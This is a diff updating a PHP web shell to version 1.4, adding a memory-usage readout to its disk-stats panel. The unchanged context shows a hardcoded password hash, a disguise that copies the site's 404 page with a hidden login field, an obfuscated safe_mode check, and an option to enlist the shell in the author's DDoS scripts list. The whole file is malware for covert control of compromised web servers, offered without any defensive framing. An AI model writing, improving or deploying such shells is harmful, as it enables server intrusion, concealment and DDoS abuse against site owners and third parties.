@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 1.3;
+$version            = 1.4;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = false; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -1103,9 +1103,21 @@ echo getcfg("s\x61f\x65_mo\x64e");
 	p('<span style="color:black;">Total ' . sizecount($all) . '</span>');
 	p('|');
 	p('<span style="color:#black;">' . @round(100 / ($all / $free), 2) . '%</span>');
+	p('<br />');
+	p('Current Used Memory:');
+	function convert($size)
+	{
+		$unit=array('b','kb','mb','gb','tb','pb');
+		return @round($size/pow(1024,($i=floor(log($size,1024)))),2).' '.$unit[$i];
+	}
+
+	echo convert(memory_get_usage(true)); // 123 kb
+	
+	p('<br />');
 	
 	p('<div class="progress"><div class="progress-bar active" role="progressbar" aria-valuenow="'. sizecount($free) .'" aria-valuemin="0" aria-valuemax="'. sizecount($all) .'" style="width: ' . @round(100 / ($all / $free), 2) . '"><span class="sr-only">' . sizecount($free) . '</span></div></div>');
 	
+
 	p('<a rel="nofollow" href="http://www.qrcode-generator.de" border="0" style="cursor:default">
 	<img src="https://chart.googleapis.com/chart?cht=qr&chl=http%3A%2F%2F'.$_SERVER['HTTP_HOST'].''.$_SERVER['REQUEST_URI'].'&chs=180x180&choe=UTF-8&chld=L|2" alt=""></a>
 	');
